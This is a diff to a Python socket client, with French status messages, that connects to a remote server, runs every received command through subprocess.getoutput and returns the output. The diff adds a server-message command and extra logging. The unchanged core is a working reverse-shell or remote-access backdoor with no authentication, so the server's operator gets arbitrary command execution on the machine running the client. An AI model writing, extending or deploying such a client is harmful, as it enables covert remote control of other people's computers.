@@ -18,14 +18,23 @@ class ClientThread(threading.Thread):
             print(f"[+] Connecté au serveur {self.host}:{self.port}")
 
             while self.running:
-                command = self.sock.recv(1024).decode()
-
+                command = self.sock.recv(1024)
                 if not command:
+                    print("[*] Connexion fermée par le serveur.")
                     break
+
+                command = command.decode()
 
                 if command.lower() == "exit":
+                    print("[*] Commande de déconnexion reçue, fermeture client.")
                     self.running = False
                     break
+
+                if command.startswith("msg "):
+                    message = command[4:]
+                    print(f"[MESSAGE DU SERVEUR] {message}")
+                    self.sock.send("[OK] Message affiché".encode())
+                    continue
 
                 output = self.execute_command(command)
                 self.sock.send(output.encode())
@@ -42,4 +51,4 @@ class ClientThread(threading.Thread):
             result = subprocess.getoutput(command)
             return result if result else "[*] Commande exécutée sans sortie."
         except Exception as e:
-            return f"[!] Erreur lors de l'exécution : {str(e)}"
+            return f"[!] Erreur d'exécution : {str(e)}"
